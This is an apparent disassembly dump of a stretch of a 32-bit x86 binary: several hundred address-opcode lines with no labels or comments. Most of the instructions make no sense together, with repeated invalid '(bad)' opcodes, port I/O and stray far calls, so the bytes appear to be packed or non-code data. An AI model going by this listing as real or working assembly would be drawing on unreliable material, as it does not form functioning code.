  415669:	les    ecx,FWORD PTR [esi]
  41566b:	fnsave [edi-0x6fafa825]
  415671:	daa    
  415672:	mov    al,ds:0x9a790495
  415677:	xor    eax,0xae74e9
  41567c:	cmp    cl,BYTE PTR [eax-0x70262199]
  415682:	pop    ss
  415683:	js     0x415656
  415685:	or     BYTE PTR [edx+eax*2+0x3d],al
  415689:	or     DWORD PTR [ebx+0x57],ebx
  41568c:	pop    ss
  41568d:	push   es
  41568e:	mov    ecx,0x9d2db2b7
  415693:	fwait
  415694:	cmp    cl,ch
  415696:	dec    esp
  415697:	fs xchg esp,eax
  415699:	fwait
  41569a:	rcr    BYTE PTR [esi],1
  41569c:	sar    BYTE PTR ds:0x18ef1e5f,cl
  4156a2:	xor    dl,BYTE PTR [ebp-0x1d]
  4156a5:	mov    dh,al
  4156a7:	and    ebp,DWORD PTR [ecx+0x40]
  4156aa:	sbb    BYTE PTR [eax+0x3d09a184],dl
  4156b0:	mov    al,ds:0xda5e40a6
  4156b5:	mov    bl,0xd0
  4156b7:	mov    esp,edx
  4156b9:	inc    ebx
  4156ba:	test   BYTE PTR [ebp-0x45],bh
  4156bd:	lods   eax,DWORD PTR ds:[esi]
  4156be:	push   eax
  4156bf:	outs   dx,BYTE PTR ds:[esi]
  4156c0:	xor    DWORD PTR [esi],ecx
  4156c2:	clc    
  4156c3:	mov    al,0x86
  4156c5:	std    
  4156c6:	(bad)  
  4156c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156c8:	bound  edi,QWORD PTR [esi]
  4156ca:	sbb    ebp,ebx
  4156cc:	add    eax,0x9718263d
  4156d1:	retf   0x8088
  4156d4:	js     0x415715
  4156d6:	retf   0x809d
  4156d9:	fwait
  4156da:	mov    al,0x2c
  4156dc:	sub    edx,ebx
  4156de:	jae    0x4156b3
  4156e0:	int3   
  4156e1:	ret    
  4156e2:	inc    esi
  4156e3:	xor    bl,BYTE PTR [ecx-0x77c64b64]
  4156e9:	adc    eax,0x26ba561b
  4156ee:	int3   
  4156ef:	sub    ah,ch
  4156f1:	lods   al,BYTE PTR ds:[esi]
  4156f2:	test   DWORD PTR [ecx+0x4b76d01e],0xda91e6e8
  4156fc:	mov    eax,ds:0x667d722e
  415701:	mov    edi,0xf2667e27
  415706:	mov    ebp,0x490ccd4e
  41570b:	pusha  
  41570c:	retf   0xfa86
  41570f:	push   0xffffffd3
  415711:	cld    
  415712:	mov    bh,BYTE PTR [eax+0x2e]
  415715:	sub    cl,ch
  415717:	sub    DWORD PTR [edi+eax*1+0x4a34fad0],esi
  41571e:	and    esi,DWORD PTR [edi]
  415720:	pop    edi
  415721:	lahf   
  415722:	inc    esp
  415723:	lock mov ebx,0x7d5c594b
  415729:	inc    ebp
  41572a:	add    al,0x4e
  41572c:	ins    BYTE PTR es:[edi],dx
  41572d:	and    al,0x79
  41572f:	clc    
  415730:	nop
  415731:	repnz cmp al,bh
  415734:	cld    
  415735:	push   0xce2e2880
  41573a:	mov    bh,0x7c
  41573c:	out    0xb,eax
  41573e:	fst    DWORD PTR [edi]
  415740:	inc    ebp
  415741:	push   es
  415742:	in     eax,dx
  415743:	mov    gs,ebp
  415745:	test   al,0x59
  415747:	push   ss
  415748:	mov    ebp,0xec53c3c7
  41574d:	test   al,0x1e
  41574f:	pop    esp
  415750:	mov    cl,0x9a
  415752:	fcom   DWORD PTR [ecx+0x68]
  415755:	cmp    ebp,esi
  415757:	in     al,0x15
  415759:	jno    0x4157cd
  41575b:	rol    BYTE PTR [ebx+0x15536f31],1
  415761:	imul   ebp,DWORD PTR [ebp-0x57a0f18a],0xd381a98c
  41576b:	cwde   
  41576c:	xchg   ebp,eax
  41576d:	mov    al,ds:0x423c82a0
  415772:	and    eax,0x89b85326
  415777:	es mov dh,0x33
  41577a:	rcr    DWORD PTR [edi],0xcf
  41577d:	push   edx
  41577e:	test   eax,0xba3c6e73
  415783:	fdiv   st(6),st
  415785:	rep ins BYTE PTR es:[edi],dx
  415787:	mov    eax,ds:0x797fa4aa
  41578c:	jle    0x4157de
  41578e:	mov    ch,0x52
  415790:	(bad)  
  415791:	cmc    
  415792:	dec    ebx
  415793:	add    al,0x94
  415795:	mov    edi,0xb8d7c1d0
  41579a:	xchg   esi,eax
  41579b:	mov    esp,0xe4a747a8
  4157a0:	es xchg esi,eax
  4157a2:	int    0xe7
  4157a4:	dec    esi
  4157a5:	inc    ecx
  4157a6:	and    BYTE PTR [edi-0x33c5e6ef],dl
  4157ac:	shl    BYTE PTR [edx-0x10cb0715],1
  4157b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157b3:	pop    ds
  4157b4:	adc    esp,DWORD PTR [ecx-0x7f9b9bf3]
  4157ba:	xchg   edi,eax
  4157bb:	and    BYTE PTR [ebx-0x4d],0xac
  4157bf:	dec    esi
  4157c0:	or     DWORD PTR [edx],edi
  4157c2:	(bad)  
  4157c3:	fldcw  WORD PTR [ecx+0x2636b741]
  4157c9:	adc    al,0x70
  4157cb:	ror    edi,cl
  4157cd:	nop
  4157ce:	ret    
  4157cf:	push   edx
  4157d0:	add    ebp,esp
  4157d2:	xchg   DWORD PTR [ecx+0x79],esp
  4157d5:	and    ch,BYTE PTR [esi]
  4157d7:	xor    eax,0x73cd68ee
  4157dc:	mov    es,WORD PTR [edi+eiz*8-0x7956e57d]
  4157e3:	jno    0x415856
  4157e5:	mov    ecx,0xcc4d69c3
  4157ea:	mov    gs,ecx
  4157ec:	enter  0x22f6,0x92
  4157f0:	repz mov cl,0xf
  4157f3:	mov    ebx,0x7742654b
  4157f8:	add    ebp,DWORD PTR [eax]
  4157fa:	xor    DWORD PTR [ecx+0x49],edx
  4157fd:	pop    esp
  4157fe:	mov    eax,0x54fc1d86
  415803:	inc    esi
  415804:	pusha  
  415805:	pop    eax
  415806:	lds    esp,FWORD PTR ds:0xf8086c39
  41580c:	retf   
  41580d:	xchg   esp,eax
  41580e:	push   ecx
  41580f:	out    0xf1,al
  415811:	cwde   
  415812:	stos   BYTE PTR es:[edi],al
  415813:	fldenv [ecx]
  415815:	pop    ebp
  415816:	mov    al,ds:0x2437dba
  41581b:	xor    al,0x12
  41581d:	aad    0xfb
  41581f:	test   eax,0xa61de61a
  415824:	rcl    ecx,1
  415826:	mov    eax,0x530aa4b3
  41582b:	cmp    al,0x2c
  41582d:	scas   eax,DWORD PTR es:[edi]
  41582e:	clc    
  41582f:	cmp    DWORD PTR [ebx+esi*8+0x57],eax
  415833:	and    edi,DWORD PTR [edx-0x26]
  415836:	mov    bh,0xd6
  415838:	fwait
  415839:	dec    ecx
  41583a:	je     0x415829
  41583c:	ret    
  41583d:	or     al,0x8c
  41583f:	aam    0xc5
  415841:	pop    ss
  415842:	pop    ecx
  415843:	add    BYTE PTR [eax-0x1d],dl
  415846:	pop    esi
  415847:	in     al,0xc9
  415849:	pop    ebx
  41584a:	push   ebx
  41584b:	lods   al,BYTE PTR ds:[esi]
  41584c:	clc    
  41584d:	cli    
  41584e:	mov    esi,0x75807f16
  415853:	xchg   ebx,eax
  415854:	ret    0x8cce
  415857:	xchg   edx,eax
  415858:	push   edi
  415859:	sti    
  41585a:	repnz out 0x85,al
  41585d:	pop    ds
  41585e:	and    BYTE PTR [esi+0x60],ah
  415861:	ja     0x41581c
  415863:	xchg   ecx,eax
  415864:	pop    es
  415865:	pop    es
  415866:	sbb    esi,DWORD PTR [edi+ebx*4+0xb]
  41586a:	stc    
  41586b:	lock test DWORD PTR [esi+0x55],edx
  41586f:	pop    eax
  415870:	xchg   ebp,eax
  415871:	cmp    DWORD PTR [edx-0x368679a5],esi
  415877:	mov    DWORD PTR [ebx-0xccad638],ebp
  41587d:	jno    0x41580b
  41587f:	fucomp st(7)
  415881:	inc    eax
  415882:	mov    edi,0x18823c5
  415887:	ret    
  415888:	cld    
  415889:	cmp    dh,BYTE PTR [ecx-0x72b4adfe]
  41588f:	mov    edx,esp
  415891:	imul   ebx,ebp,0xffffff93
  415894:	les    ecx,FWORD PTR [esi]
  415896:	(bad)  
  415897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415898:	push   es
  415899:	mov    ebx,ebp
  41589b:	scas   eax,DWORD PTR es:[edi]
  41589c:	shr    al,0xd3
  41589f:	sub    al,0x58
  4158a1:	test   BYTE PTR [ebx],bh
  4158a3:	cmp    eax,0x9c349229
  4158a8:	std    
  4158a9:	js     0x4158ff
  4158ab:	sbb    cl,BYTE PTR ds:0x2c2500b0
  4158b1:	sbb    ebx,DWORD PTR [esi-0x7b5eae09]
  4158b7:	out    0xc5,al
  4158b9:	(bad)  
  4158ba:	mov    ch,0x1
  4158bc:	hlt    
  4158bd:	popa   
  4158be:	sbb    DWORD PTR [edi],ecx
  4158c0:	cmp    DWORD PTR [ecx-0x6bcccea5],0x13
  4158c7:	jo     0x415928
  4158c9:	(bad)  
  4158ca:	fild   QWORD PTR [ecx-0x5d]
  4158cd:	fcomp  DWORD PTR [edi]
  4158cf:	xchg   ecx,eax
  4158d0:	das    
  4158d1:	add    DWORD PTR [ebp+0x138a81d9],ebp
  4158d7:	addr16 cmp eax,0xbe2fcd31
  4158dd:	or     ch,bh
  4158df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e0:	and    esi,DWORD PTR [eax+0x1d2e9932]
  4158e6:	xchg   ecx,eax
  4158e7:	fbstp  TBYTE PTR [eax]
  4158e9:	imul   edi,DWORD PTR [edi-0x52],0xffffff8e
  4158ed:	stos   BYTE PTR es:[edi],al
  4158ee:	push   cs
  4158ef:	(bad)  
  4158f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f2:	add    ebx,ecx
  4158f4:	pusha  
  4158f5:	mov    ecx,esi
  4158f7:	xchg   edx,eax
  4158f8:	dec    eax
  4158f9:	jnp    0x415942
  4158fb:	mov    dl,0x1e
  4158fd:	ins    DWORD PTR es:[edi],dx
  4158fe:	inc    ecx
  4158ff:	xor    BYTE PTR [ecx+eax*2-0x7a],0xcb
  415904:	inc    edx
  415905:	ja     0x4158e5
  415907:	mov    edx,0xa3028198
  41590c:	outs   dx,BYTE PTR ds:[esi]
  41590d:	jecxz  0x415930
  41590f:	test   DWORD PTR [ebx+esi*8-0xa],ebx
  415913:	div    DWORD PTR fs:[edx+0x3e]
  415917:	addr16 imul dh
  41591a:	mov    bl,0xfb
  41591c:	(bad)  
  41591d:	push   esi
  41591e:	scas   al,BYTE PTR es:[edi]
  41591f:	push   ebx
  415920:	rol    BYTE PTR [esp+eax*1-0x2],cl
  415924:	or     dh,BYTE PTR [edx]
  415926:	cmp    eax,0x6d349cc0
  41592b:	mov    ds:0x5952cdcd,al
  415930:	adc    al,0xb8
  415932:	cmp    al,0x62
  415934:	mov    esp,0x70e9b199
  415939:	inc    ecx
  41593a:	inc    edi
  41593b:	fwait
  41593c:	and    edi,DWORD PTR [eax-0x586bfcba]
  415942:	stc    
  415943:	aam    0x5f
  415945:	js     0x4158ed
  415947:	daa    
  415948:	mov    DWORD PTR [esi-0x27],esi
  41594b:	mov    edi,0xe6fa1834
  415950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415951:	mov    ebp,0x2cf85385
  415956:	sub    al,0xa6
  415958:	test   BYTE PTR [ebp-0x2edcab72],ah
  41595e:	inc    esi
  41595f:	enter  0xdb1d,0xb4
  415963:	add    ch,BYTE PTR [edi]
  415965:	retf   0x2e15
  415968:	dec    esp
  415969:	inc    edi
  41596a:	jo     0x41599c
  41596c:	push   ebp
  41596d:	pop    ecx
  41596e:	push   esp
  41596f:	inc    ecx
  415970:	push   esp
  415971:	sub    dh,bl
  415973:	ss es sub al,0x4d
  415977:	shr    DWORD PTR [esp+edx*1+0x1b74c702],cl
  41597e:	aas    
  41597f:	shl    BYTE PTR [eax+0x6724e5be],0x16
  415986:	sbb    bh,BYTE PTR [edx+0x1ff07bba]
  41598c:	mov    DWORD PTR [ebp-0x25509405],edx
  415992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415993:	xor    esp,DWORD PTR [edi-0x35c83a2]
  415999:	leave  
  41599a:	jno    0x4159fd
  41599c:	and    eax,0x89fbd45f
  4159a1:	lahf   
  4159a2:	es adc ah,dh
  4159a5:	sub    DWORD PTR [ebx],esi
  4159a7:	pop    ebx
  4159a8:	hlt    
  4159a9:	xchg   esp,eax
  4159aa:	(bad)  
  4159ab:	bound  ebx,QWORD PTR [edx]
  4159ad:	out    0x5e,eax
  4159af:	int    0xe3
  4159b1:	add    edi,DWORD PTR [esi]
  4159b3:	repz mov dl,0x50
  4159b6:	fcomp  DWORD PTR [esi-0x14]
  4159b9:	sub    ebp,ecx
  4159bb:	mov    ecx,DWORD PTR [ebx+edi*1+0x7e6d766a]
  4159c2:	jnp    0x4159cf
  4159c4:	dec    esi
  4159c5:	xlat   BYTE PTR ds:[ebx]
  4159c6:	cmp    bl,dh
  4159c8:	sub    ah,BYTE PTR [edx-0x1b3b4c0e]
  4159ce:	in     eax,0x2
  4159d0:	xor    DWORD PTR [ecx+0x1978a27],esi
  4159d6:	xor    al,0x47
  4159d8:	pop    esi
  4159d9:	mov    ebx,DWORD PTR [ecx-0x4e062806]
  4159df:	or     eax,0xd7eb45c4
  4159e4:	mov    eax,0x522f9e0
  4159e9:	and    eax,0xecc6af83
  4159ee:	jle    0x4159b9
  4159f0:	jge    0x415a2c
  4159f2:	cs inc ebp
  4159f4:	leave  
  4159f5:	mov    dh,0x94
  4159f7:	fild   WORD PTR [esi+0x3f6df748]
  4159fd:	retf   
  4159fe:	ins    BYTE PTR es:[edi],dx
  4159ff:	clc    
  415a00:	js     0x4159b0
  415a02:	sub    BYTE PTR [edx-0x3195f665],0x28
  415a09:	sbb    DWORD PTR [esi],0xffffffff
  415a0c:	adc    esp,0xf
  415a0f:	jle    0x415a6d
  415a11:	or     eax,0x7e91cc02
  415a16:	mov    dh,0xab
  415a18:	xchg   edx,eax
  415a19:	dec    edx
  415a1a:	call   0x5c6f:0xafa1bd9d
  415a21:	mov    edx,0xb82879e1
  415a26:	pop    edx
  415a27:	lods   al,BYTE PTR ds:[esi]
  415a28:	adc    DWORD PTR [edx],0xffffffa1
  415a2b:	ss mov cl,0x90
  415a2e:	mov    ch,bl
  415a30:	imul   ecx,eax,0xffffffc0
  415a33:	mov    eax,0x228023db
  415a38:	icebp  
  415a39:	mov    eax,ds:0x722a7352
  415a3e:	inc    esp
  415a3f:	scas   eax,DWORD PTR es:[edi]
  415a40:	mov    ebp,0xef51936d
  415a45:	lock in al,dx
  415a47:	pop    edx
  415a48:	sub    ebx,esi
  415a4a:	imul   ebp,DWORD PTR ds:0x1b23ee1f,0xffffffb7
  415a51:	inc    ebx
  415a52:	mov    ebp,0x3a555eae
  415a57:	inc    ebx
  415a58:	retf   
  415a59:	jnp    0x4159e4
  415a5b:	cmp    dh,bl
  415a5d:	arpl   WORD PTR [edx-0x62],dx
  415a60:	mov    edi,0xc044c8a8
  415a65:	xchg   edi,eax
  415a66:	aaa    
  415a67:	xchg   edx,eax
  415a68:	out    0xc0,al
  415a6a:	mov    ebp,0x64bcc39
  415a6f:	js     0x415a9d
  415a71:	out    dx,al
  415a72:	(bad)  
  415a74:	pusha  
  415a75:	push   ebp
  415a76:	or     ch,BYTE PTR [edi+0x56]
  415a79:	mov    DWORD PTR [bp+si+0x28cf],esp
  415a7e:	inc    edx
  415a7f:	stos   BYTE PTR es:[edi],al
  415a80:	push   es
  415a81:	add    eax,0xe762022
  415a86:	test   al,0x3a
  415a88:	mov    ds:0x5ced592f,al
  415a8d:	pop    ebx
  415a8e:	mov    edx,0x49efb6d5
  415a93:	mov    ebx,0xfb32cde5
  415a98:	aam    0xd7
  415a9a:	xchg   DWORD PTR [ebp-0x75a35789],esp
  415aa0:	push   ss
  415aa1:	add    ch,0xd5
  415aa4:	sbb    dh,BYTE PTR [eax-0x2a753d13]
  415aaa:	mov    eax,0x5a566a36
  415aaf:	inc    edx
  415ab0:	jne    0x415ad2
  415ab2:	inc    esp
  415ab3:	xlat   BYTE PTR ds:[ebx]
  415ab4:	cmp    DWORD PTR [eax-0x647063fa],0x3ac3713c
  415abe:	pop    ebp
  415abf:	sub    esi,ebx
  415ac1:	or     DWORD PTR [ebx-0x6e],edi
  415ac4:	add    BYTE PTR [ebx+eiz*1],0xaf
  415ac8:	cmpxchg dh,dl
  415acb:	inc    edx
  415acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415acd:	repz xor al,0xd2
  415ad0:	xor    edx,DWORD PTR [eax-0x5b]
  415ad3:	scas   eax,DWORD PTR es:[edi]
  415ad4:	sub    BYTE PTR [ebp+0x64],ah
  415ad7:	sub    dh,0x44
  415ada:	add    al,0x76
  415adc:	inc    ebx
  415add:	mov    ebx,DWORD PTR [esp+esi*1]
  415ae0:	rcr    DWORD PTR [ebp+0x6b8493a7],cl
  415ae6:	les    ebp,FWORD PTR [edi+0x2d]
  415ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aea:	mov    ecx,0x159197d4
  415aef:	ror    BYTE PTR [eax],1
  415af1:	sub    esp,DWORD PTR es:[bp+di]
  415af5:	push   eax
  415af6:	jbe    0x415aac
  415af8:	or     bh,BYTE PTR [edi-0x50]
  415afb:	std    
  415afc:	imul   esp,DWORD PTR [edi],0xa52d77c6
  415b02:	test   al,0xc4
  415b04:	inc    edi
  415b05:	jo     0x415aee
  415b07:	and    BYTE PTR [eax],ah
  415b09:	push   esp
  415b0a:	fcom   QWORD PTR [ebx+0x6b]
  415b0d:	arpl   WORD PTR [ecx+0x78c52031],cx
  415b13:	rcl    DWORD PTR [esi-0x509ba1e6],cl
  415b19:	xor    ecx,edx
  415b1b:	cmp    BYTE PTR [esi-0x699ee450],ah
  415b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b22:	dec    edx
  415b23:	addr16 pop ebx
  415b25:	stos   DWORD PTR es:[edi],eax
  415b26:	in     al,dx
  415b27:	ror    DWORD PTR [edx+0x6d37c014],1
  415b2d:	add    al,0xaf
  415b2f:	pop    esi
  415b30:	lods   eax,DWORD PTR ds:[esi]
  415b31:	and    ch,0x6a
  415b34:	push   0x1f674134
  415b39:	pop    ss
  415b3a:	idiv   DWORD PTR [esi+ebp*1+0x77]
  415b3e:	mov    esp,esi
  415b40:	repnz in eax,dx
  415b42:	in     al,dx
  415b43:	cmp    ecx,ecx
  415b45:	in     al,dx
  415b46:	sbb    dh,bh
  415b48:	sub    DWORD PTR [esi-0x53],edx
  415b4b:	adc    eax,DWORD PTR [ebx-0x45]
  415b4e:	jbe    0x415ae1
  415b50:	inc    edx
  415b51:	cs mov edx,0x81b7698c
  415b57:	in     eax,0xf
  415b59:	pop    ebx
  415b5a:	je     0x415b9f
  415b5c:	retf   
  415b5d:	pop    esi
  415b5e:	stc    
  415b5f:	retf   0xe6fd
  415b62:	inc    ecx
  415b63:	in     eax,0x5
  415b65:	xchg   esp,eax
  415b66:	(bad)  [ebx+0x60]
  415b69:	rcr    DWORD PTR [ebx+0x4b],1
  415b6c:	sub    ch,dh
  415b6e:	lea    edi,[edi]
  415b70:	cmp    eax,DWORD PTR [ebx]
  415b72:	repz (bad) 
  415b74:	out    dx,eax
  415b75:	add    BYTE PTR [ebx+0x54],bh
  415b78:	dec    ecx
  415b79:	inc    esp
  415b7a:	jecxz  0x415b68
  415b7c:	in     al,0x99
  415b7e:	mov    BYTE PTR [edx-0x2d8ed8a5],cl
  415b84:	cmp    BYTE PTR [eax-0x51],ch
  415b87:	pushf  
  415b88:	shl    DWORD PTR [ecx],0xd4
  415b8b:	shl    dh,cl
  415b8d:	xchg   esi,eax
  415b8e:	sub    edx,esi
  415b90:	imul   eax,DWORD PTR [ebx],0xaadd5246
  415b96:	mov    ch,0xb0
  415b98:	lods   al,BYTE PTR ds:[esi]
  415b99:	xchg   esi,eax
  415b9a:	or     bh,bh
  415b9c:	add    ebx,edi
  415b9e:	aad    0x74
  415ba0:	rol    ebx,1
  415ba2:	lods   eax,DWORD PTR ds:[esi]
  415ba3:	xchg   ebp,eax
  415ba4:	sar    DWORD PTR [edi],0x23
  415ba7:	scas   eax,DWORD PTR es:[edi]
  415ba8:	mov    ah,dh
  415baa:	int3   
  415bab:	push   eax
  415bac:	popa   
  415bad:	(bad)  
  415bae:	daa    
  415baf:	popf   
  415bb0:	cmp    ebp,DWORD PTR ds:0xe7fce2c6
  415bb6:	add    eax,0x7ed17300
  415bbb:	push   ebx
  415bbc:	add    bl,BYTE PTR [eax+ebx*4]
  415bbf:	aas    
  415bc0:	cmc    
  415bc1:	aam    0xac
  415bc3:	js     0x415c13
  415bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bc6:	dec    esi
  415bc7:	(bad)  
  415bc8:	stc    
  415bc9:	xor    BYTE PTR [edx],al
  415bcb:	iret   
  415bcc:	call   0x2600ee1c
  415bd1:	sub    eax,0xbca3af0b
  415bd6:	sahf   
  415bd7:	mov    BYTE PTR [eax],cl
  415bd9:	repz xor eax,DWORD PTR [eax]
  415bdc:	mov    DWORD PTR [esi+0x5a300fe1],ebp
  415be2:	mov    eax,0xce60afa9
  415be7:	sub    eax,0x5fc806a4
  415bec:	mov    al,0x6a
  415bee:	test   BYTE PTR [edx-0x724aeb0e],dh
  415bf4:	add    edx,DWORD PTR [ebx]
  415bf6:	popf   
  415bf7:	sub    BYTE PTR [edx],dh
  415bf9:	pusha  
  415bfa:	mov    ah,0xdd
  415bfc:	into   
  415bfd:	neg    DWORD PTR [esi+0x8]
  415c00:	sti    
  415c01:	scas   al,BYTE PTR es:[edi]
  415c02:	cmp    bl,BYTE PTR [esp+ecx*1-0x117960fd]
  415c09:	int    0x7
  415c0b:	fcomp  DWORD PTR ds:0x8e3afbe
  415c11:	mov    eax,0x55e13a6
  415c16:	push   0xffffffcf
  415c18:	push   ds
  415c19:	dec    esp
  415c1a:	repz scas al,BYTE PTR es:[edi]
  415c1c:	mov    dl,0x50
  415c1e:	mov    cl,0x4a
  415c20:	int3   
  415c21:	hlt    
  415c22:	sbb    al,0x63
  415c24:	int3   
  415c25:	cmp    ch,BYTE PTR [ebp-0x2d]
  415c28:	in     eax,0x14
  415c2a:	mov    es,WORD PTR [ebp+0x2d969fb3]
  415c30:	add    eax,0xee3d520
  415c35:	sub    al,0x73
  415c37:	mov    dl,0xb2
  415c39:	mov    eax,ds:0x7ea4d5e5
  415c3e:	add    bl,BYTE PTR [esi+0x3a]
  415c41:	mov    bh,BYTE PTR [eax]
  415c43:	aas    
  415c44:	nop
  415c45:	sub    cl,BYTE PTR [ebp-0x299062e]
  415c4b:	ins    BYTE PTR es:[edi],dx
  415c4c:	push   0x7ceb6a
  415c51:	jle    0x415bdd
  415c53:	mov    eax,ds:0xebb02383
  415c58:	jecxz  0x415caf
  415c5a:	jge    0x415c99
  415c5c:	ret    
  415c5d:	jge    0x415c86
  415c5f:	xlat   BYTE PTR ds:[ebx]
  415c60:	inc    ebx
  415c61:	push   eax
  415c62:	stc    
  415c63:	xchg   edi,eax
  415c64:	clc    
  415c65:	or     dh,BYTE PTR [edx]
  415c67:	cmp    BYTE PTR ds:0x735302a1,0xaa
  415c6e:	mov    ebx,0x3f3ffb7b
  415c73:	out    0xd,al
  415c75:	hlt    
  415c76:	jb     0x415c3d
  415c78:	mov    al,ds:0x1abc7a67
  415c7d:	mov    al,0xbe
  415c7f:	mov    bl,0xf4
  415c81:	mov    esi,0x5689e017
  415c86:	ror    ebx,1
  415c88:	mov    edx,0xb58d4e10
  415c8d:	clc    
  415c8e:	repnz aam 0xe4
  415c91:	sbb    BYTE PTR [ebx],dh
  415c93:	cmp    al,0x31
  415c95:	sub    edx,0xa891e765
  415c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c9c:	mov    eax,0x89687de5
  415ca1:	ins    BYTE PTR es:[edi],dx
  415ca2:	dec    esp
  415ca3:	mov    dl,0x8b
  415ca5:	mov    ds:0xacf8a125,al
  415caa:	sub    ecx,esp
  415cac:	mov    ds:0x997458cc,eax
  415cb1:	mov    dh,0x63
  415cb3:	fs push cs
  415cb5:	data16 and al,0x89
  415cb8:	clc    
  415cb9:	jl     0x415cef
  415cbb:	mov    bl,0x20
  415cbd:	outs   dx,BYTE PTR ds:[esi]
  415cbe:	pop    ecx
  415cbf:	hlt    
  415cc0:	or     ebx,DWORD PTR [ebx+0x6f49b525]
  415cc6:	dec    ebx
  415cc7:	pop    ebx
  415cc8:	cmc    
  415cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cca:	int    0x3e
  415ccc:	out    0xca,al
  415cce:	enter  0x5be3,0xd2
  415cd2:	xor    BYTE PTR [edx-0x10],0x8d
  415cd6:	shl    BYTE PTR [edx+0x51],0x7f
  415cda:	jne    0x415c66
  415cdc:	(bad)  
  415cdd:	psubd  mm5,QWORD PTR [esi+0x10b39c5f]
  415ce4:	sbb    al,0xb0
  415ce6:	outs   dx,BYTE PTR ds:[esi]
  415ce7:	adc    al,BYTE PTR [edx-0x6d]
  415cea:	mov    eax,DWORD PTR [esi-0x19]
  415ced:	mov    BYTE PTR [edx-0x3e],bl
  415cf0:	mov    BYTE PTR [ebp-0x77],ah
  415cf3:	repnz mov ds:0xcf3e5af8,al
  415cf9:	inc    esi
  415cfa:	mov    ah,BYTE PTR [eax-0x5c7bfd0b]
  415d00:	or     dh,ch
  415d02:	call   0x17ce:0xc94c85fe
  415d09:	mov    ss,WORD PTR [esi+0x3]
  415d0c:	push   edx
  415d0d:	xor    bl,BYTE PTR [ecx+0x53]
  415d10:	and    eax,0x2260789a
  415d15:	repnz repz push eax
  415d18:	(bad)  
  415d19:	mov    ebp,0x49a6cda8
  415d1e:	jg     0x415d0a
  415d20:	mov    edi,0xaa88af05
  415d25:	cli    
  415d26:	xchg   edi,esp
  415d28:	and    BYTE PTR [ebp-0x51],dl
  415d2b:	cmp    DWORD PTR [edx-0x2e9da08c],eax
  415d31:	adc    DWORD PTR [ecx-0x4d],eax
  415d34:	sub    al,bh
  415d36:	ss push esi
  415d38:	dec    ebx
  415d39:	fwait
  415d3a:	lods   eax,DWORD PTR ds:[esi]
  415d3b:	sbb    ch,dl
  415d3d:	jne    0x415cc0
  415d3f:	in     al,dx
  415d40:	mov    ch,0x25
  415d42:	mov    dl,0x3f
  415d44:	dec    edi
  415d45:	(bad)  
  415d47:	mov    bl,BYTE PTR [esi-0x6c2ed0e2]
  415d4d:	aaa    
  415d4e:	sub    eax,0x699d59b4
  415d53:	mov    esi,DWORD PTR [edi-0x172424d]
  415d59:	fwait
  415d5a:	out    0x65,eax
  415d5c:	add    al,0x1a
  415d5e:	ja     0x415d6b
  415d60:	repz fadd DWORD PTR [ebx+0x77]
  415d64:	pop    eax
  415d65:	push   ss
  415d66:	sub    esi,DWORD PTR [edx]
  415d68:	in     al,dx
  415d69:	int3   
  415d6a:	popf   
  415d6b:	dec    eax
  415d6c:	inc    ebp
  415d6d:	sbb    BYTE PTR [edx-0x49],cl
  415d70:	jecxz  0x415d46
  415d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d73:	ret    0xe6ee
  415d76:	sub    DWORD PTR [ecx-0x36],esp
  415d79:	pop    es
  415d7a:	sub    al,0x7f
  415d7c:	cmp    ch,BYTE PTR [esi]
  415d7e:	pop    ds
  415d7f:	rol    BYTE PTR [eax-0x7ff1fe3c],0x1e
  415d86:	inc    esi
  415d87:	sub    ah,ch
  415d89:	lea    ecx,[esi+0x21]
  415d8c:	les    ebp,FWORD PTR [edi-0x51]
  415d8f:	vpsubusw xmm3,xmm1,XMMWORD PTR [edx]
  415d93:	push   ss
  415d94:	cli    
  415d95:	gs mov edx,0x6cfa1f4
  415d9b:	jnp    0x415d3e
  415d9d:	hlt    
  415d9e:	dec    edx
  415d9f:	cmp    eax,0xf3e61d62
  415da4:	out    0x69,eax
  415da6:	cmp    BYTE PTR [esi+0x21],dh
  415da9:	sub    BYTE PTR [edi-0x6c6b7b0a],ah
  415daf:	stos   BYTE PTR es:[edi],al
  415db0:	popa   
  415db1:	retf   0xb67d
  415db4:	ins    BYTE PTR es:[edi],dx
  415db5:	into   
  415db6:	cs ror dl,1
  415db9:	push   ss
  415dba:	pop    eax
  415dbb:	inc    esp
  415dbc:	std    
  415dbd:	fwait
  415dbe:	pop    ebp
  415dbf:	pop    ecx
  415dc0:	mov    WORD PTR [esi],gs
  415dc2:	bound  ecx,QWORD PTR [edi-0x80]
  415dc5:	cwde   
  415dc6:	pop    ss
  415dc7:	pop    edi
  415dc8:	out    dx,al
  415dc9:	ins    BYTE PTR es:[edi],dx
  415dca:	cwde   
  415dcb:	ret    0xd06f
  415dce:	fidivr WORD PTR [eax+eax*1+0x28]
  415dd2:	imul   esi,DWORD PTR [esi-0x558f630],0xbf0625bc
  415ddc:	arpl   WORD PTR [edi],ax
  415dde:	lds    esi,FWORD PTR [edi-0x2b]
  415de1:	pop    ds
  415de2:	mov    ds:0xfa28d505,eax
  415de7:	add    DWORD PTR [esi-0x7f],edi
  415dea:	loop   0x415ddf
  415dec:	ins    DWORD PTR es:[edi],dx
  415ded:	push   0x4f
  415def:	cld    
  415df0:	pop    ss
  415df1:	clc    
  415df2:	fldcw  WORD PTR [ebx-0x36]
  415df5:	in     al,dx
  415df6:	fstp   QWORD PTR [ebx]
  415df8:	inc    esi
  415df9:	jb     0x415e6a
  415dfb:	sar    esp,cl
  415dfd:	repz push edx
  415dff:	out    dx,eax
  415e00:	add    al,0xdf
  415e02:	xchg   edi,eax
  415e03:	into   
  415e04:	jge    0x415db6
  415e06:	adc    ebx,DWORD PTR [ecx-0x40]
  415e09:	in     al,dx
